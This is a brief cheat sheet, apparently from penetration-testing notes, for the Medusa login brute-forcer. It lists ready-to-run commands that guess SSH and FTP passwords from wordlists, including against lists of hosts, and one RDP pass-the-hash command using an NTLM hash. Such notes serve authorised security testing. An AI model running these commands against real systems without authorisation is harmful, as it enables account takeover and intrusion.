- - -
Note : Login brute-forcer tool designed to be speedy, parallel and modular.
It supports many protocols: AFP, CVS, FTP, HTTP, IMAP, rlogin, SSH, Subversion, and VNC to name a few.
- - -
### Usage : 

**<u>For SSH</u>** : 
```sh
medusa -u testuser -P wordlist.txt -h <host> -M ssh
medusa -h <host> -U users.txt -P pass.txt -M ssh -n 2222
```

**<u>For FTP</u>** : 
```sh
medusa -h <host> -u ignite -P pass.txt -M ftp
medusa -h <host> -U users.txt -p 123 -M ftp
medusa -h <host> -U users.txt -P pass.txt -M ftp
medusa -H hosts.txt -U user.txt -P pass.txt -M ftp
medusa -h <host> -u ignite -P pass.txt -M ftp -O log.txt
medusa -H hosts.txt -U users.txt -P pass.txt -M ftp -v
```


**<u>RDP (pass-the-hash)</u>** : 
```sh
medusa -M rdp -m PASS:HASH -h <host> -u someuser -p <NTLM_hash>
```

- - -





